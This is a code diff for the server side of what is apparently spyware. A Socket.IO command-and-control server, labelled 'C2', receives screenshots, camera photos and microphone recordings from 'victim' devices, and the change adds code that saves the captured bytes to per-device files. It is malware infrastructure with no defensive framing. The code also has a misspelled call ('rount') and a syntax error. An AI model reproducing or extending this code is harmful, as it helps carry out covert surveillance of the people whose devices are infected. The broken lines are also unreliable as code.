@@ -55,11 +55,14 @@ def update_database_and_log(value, data):
         emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'success']})
     else:
         emit("log", {'data': [f"{data['device_id']}: {data['message']}", 'danger']})
+    log_to_console(data)
     write_to_log_file(data)
 
 
-def write_bytes_and_log(value, data):
-    # write bytes
+def write_bytes_and_log(data):
+    f = open(f"files/{data['device_id']}/{str(rount(time.time() * 1000))}.{data['ext']}", 'wb')
+    f.write(data['bytes'])
+    f.close()
     write_to_log_file(data)
 
 # Connection from C2
@@ -177,7 +180,7 @@ def write_contact_listener(data):
 
 @socketio.on('0x7')
 def screenshot_listener(data):
-    write_bytes_and_log('victimdir', data)
+    write_bytes_and_log(data)
 
 
 @socketio.on('0x8')
@@ -187,12 +190,12 @@ def get_camera_list_listener(data):
 
 @socketio.on('0x9')
 def take_picture_listener(data):
-    write_bytes_and_log('victimdir', data)
+    write_bytes_and_log(data)
 
 
 @socketio.on('0xA')
 def record_mic_listener(data):
-    write_bytes_and_log('victimdir', data):
+    write_bytes_and_log(data):
 
 
 @socketio.on('0xB')
